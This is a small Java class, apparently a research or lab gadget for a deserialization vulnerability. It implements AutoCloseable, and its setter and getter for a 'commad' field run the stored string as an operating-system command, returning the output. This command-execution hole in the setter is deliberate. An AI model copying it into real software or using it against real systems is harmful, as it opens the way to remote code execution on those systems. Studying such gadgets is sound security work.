package com.sorry.bug;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * created by 0x22cb7139 on 2021/4/16
 */
public class customAutocloseable implements AutoCloseable {

    @Override
    public void close() throws Exception {

    }

    String commad;
    public customAutocloseable(){

    }

    public String getCommad() throws IOException {
        System.out.println(Exploit(this.commad));
        return commad;
    }

    public void setCommad(String commad) throws IOException {
        this.commad = commad;
        System.out.println(Exploit(this.commad));
    }

    public String Exploit(String cmd) throws IOException {
        System.out.println("函数调用Exploit("+cmd+")");
        Process p;
        String result="";
        String disr;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            p = Runtime.getRuntime().exec(cmd);
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
        while((disr=bufferedReader.readLine())!=null){
            result += disr + "";
        }
        //return to client 结果返回给客户端
        return result;
    }
}